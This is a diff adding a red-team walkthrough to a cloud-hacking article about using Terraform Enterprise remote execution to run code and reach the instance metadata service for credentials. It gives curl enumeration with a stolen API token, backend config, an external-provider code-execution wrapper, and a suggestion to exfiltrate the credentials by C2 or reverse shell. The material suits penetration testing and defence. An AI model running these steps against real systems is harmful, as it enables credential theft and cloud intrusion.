@@ -6,9 +6,11 @@ description: Leverage a default configuration in Terraform Enterprise to steal c
 
 [Terraform Enterprise](https://www.terraform.io/enterprise) is a self-hosted version of Terraform Cloud, allowing organizations to maintain their own private instance of Terraform. There are many benefits for an enterprise to run this, however, there is also a default configuration that Red Teamers and Penetration Testers can potentially take advantage of.
 
+If Terraform Enterprise is deployed to a VM from a cloud provider we may be able to access the instance metadata service and leverage those credentials for further attacks.
+
 ## Remote (Code) Execution
 
-For many engineers, their first experience with Terraform was locally on their workstations. When they invoked a `terraform apply` or `terraform plan` all of that activity took place on the engineers workstation, reaching out to cloud APIs, tracking state, etc.
+For many engineers, their first experience with Terraform was locally on their workstations. When they invoked a `terraform apply` or `terraform plan` all of that activity took place on the local machine (reaching out to cloud APIs, tracking state, etc.)
 
 An exciting feature of Terraform Enterprise (and Cloud) is the idea of [Remote Execution](https://www.terraform.io/cloud-docs/overview#remote-terraform-execution), wherein all those operations take place server-side. In Terraform Cloud the execution takes place in "disposable virtual machines". In [Terraform Enterprise](https://www.terraform.io/enterprise/install/interactive/installer#alternative-terraform-worker-image) however, it takes place in "disposable Docker containers". 
 
@@ -33,3 +35,122 @@ The second option would depend upon the cloud provider, but options to harden or
     Nothing should prevent these two methods from working at the same time. It is a good idea to require IMDSv2 of all EC2 instances in your environment.
 
 ## Walkthrough
+
+!!! Warning
+    This walkthrough and screenshots are not tested against Terraform Enterprise (this is a free/open source project, we don't have access to a Terraform Enterprise instance for demonstration purposes). As such it is being demoed on Terraform Cloud which, while similar, is not a 1-1 copy. If you are attempting to exploit this against your organization's TFE instance, minor tweaks may be needed. (We are open to [Pull Requests](https://github.com/Hacking-the-Cloud/hackingthe.cloud/pulls)!)
+
+!!! Note
+    If you already have a configured and initialized Terraform backend, you can skip to the [Executing Code](#executing-code) section. The following walkthrough will demonstrate the entire process from finding the token to initializing the backend.
+
+### Acquire a Terraform API Token
+
+To begin, you'll first need to 'acquire' a [Terraform API Token](https://www.terraform.io/cloud-docs/users-teams-organizations/api-tokens). These tokens can be identified by the `.atlasv1.` substring in them.
+
+As for where you would get one, there are a number of possible locations. For example, developer's may have them locally on their workstations in `~/.terraform.d/`, you may find them in CI/CD pipelines, inappropriately stored in documentation, pull them from a secrets vault, create one with a developer's stolen credentials, etc.
+
+### Identify the Organization and Workspace Names
+
+With access to a valid API token, we now need to find an Organization and Workspace we can use to be nefarious. The good news is that this information is queryable using the token. We can use a tool such as [jq](https://stedolan.github.io/jq/) to parse and display the JSON.
+
+```
+curl -H "Authorization: Bearer $TFE_TOKEN" \
+https://<TFE Instance>/api/v2/organizations | jq
+```
+
+<figure markdown>
+  ![Getting the Organization](/images/terraform/terraform_enterprise_metadata_service/get_organization.png){ loading=lazy }
+</figure>
+
+Next, we need to identify a [workspace](https://www.terraform.io/cloud-docs/api-docs/workspaces) we can use. Again, this can be quereyed using the organization `id` we gathered in the previous step.
+
+```
+curl -H "Authorization: Bearer $TFE_TOKEN" \
+https://<TFE Instance>/api/v2/organizations/<Organization ID>/workspaces | jq
+```
+<figure markdown>
+  ![Getting the Workspace](/images/terraform/terraform_enterprise_metadata_service/get_workspace.png){ loading=lazy }
+</figure>
+
+### Configure the Remote Backend
+
+Now that we have the organization and workspace id's from the previous step, we can configure the remote backend. To do this, you can use [this example](https://github.com/hashicorp/tfc-getting-started/blob/main/backend.tf) as a template with one exception. We will add a `hostname` value which is the hostname of the Terraform Enterprise instance. You can store this in a file named `backend_config.tf`.
+``` title="backend_config.tf"
+terraform {
+  backend "remote" {
+    hostname = "{{TFE_HOSTNAME}}"
+    organization = "{{ORGANIZATION_NAME}}"
+
+    workspaces {
+      name = "{{WORKSPACE_NAME}}"
+    }
+  }
+}
+```
+
+### Initialize the Backend
+
+With the backend configuration file created we can initialize the backend with the following command.
+
+```
+terraform init --backend-config='token=$TFE_TOKEN'
+```
+
+If everything has worked as it should, you should get a `Terraform has been successfully initialized` notification. To test this, you can perform a `terraform state list` to list the various state objects.
+
+### Executing Code
+
+Now that our backend has been properly configured and we can access the remote state, we can attempt to execute code. There are several ways this can be done (such as using a [local-exec provisioner](https://www.terraform.io/language/resources/provisioners/local-exec)) however, for our purposes we will be using the [External Provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs).
+
+"`external` is a special provider that exists to provide an interface between Terraform and external programs".
+
+What this means is that we can execute code during the Terraform `plan` or `apply` operations by specifying a program or script to run.
+
+To do this, we will create an `external provider` in our existing `backend_config.tf` file (if you already have an existing Terraform project you can add this block to those existing files).
+
+``` title="backend_config.tf"
+...
+
+data "external" "external_provider" {
+    program = ["python3", "wrapper.py"]
+}
+
+output "external_provider_example" {
+    value = data.external.external_provider
+}
+```
+
+You may be wondering what the `wrapper.py` file is. In order to use the `external` provider, we must "implement a specific protocol" ([source](https://registry.terraform.io/providers/hashicorp/external/latest/docs)), which is JSON. To do this, we will wrap the result of the code execution in JSON so it can be returned.
+
+!!! Note
+    The wrapper script is not strictly required if you aren't interested in getting the output. If your goal is simply to execute a C2 payload, you can include the binary in the project directory and then execute it.
+
+    Wrapping the output in JSON allows us to get the response output.
+
+Our wrapper script looks like the following (feel free to change to your needs).
+
+```py title="wrapper.py"
+import json
+import os
+
+stream = os.popen('id')
+output = stream.read()
+result = { "result" : output }
+
+print(json.dumps(result))
+```
+
+### Terraform Plan
+
+Now that the wrapper script is created (and modified), we can execute code via `terraform plan`. This is a non-destructive action, which will evaluate our local configuration vs's the remote state. In addition, it will execute our remote provider and return the result to us.
+
+<figure markdown>
+  ![Code Execution Output](/images/terraform/terraform_enterprise_metadata_service/code_exec_output.png){ loading=lazy }
+</figure>
+
+!!! Warning
+    Upon executing `terraform plan` you may encounter errors for various reasons depending upon the remote state. Those errors will need to be handled on a case by case basis. Typically this involves modifying your `.tf` files to suit the remote state. This can typically be figured out based on the results of `terraform state pull`.
+
+From here, we can modify our wrapper script to do a variety of things such as (the purpose of this article) reaching out to the metadata service and pulling those credentials.
+
+!!! Note
+    The results of this run are logged elsewhere. Please do not leak secrets or other sensitive information to parties who do not have a need for the information. A more efficient method would be to use a C2 platform such as [Mythic](https://docs.mythic-c2.net/) (or even just a TLS encrypted reverse shell) to exfiltrate the credentials.
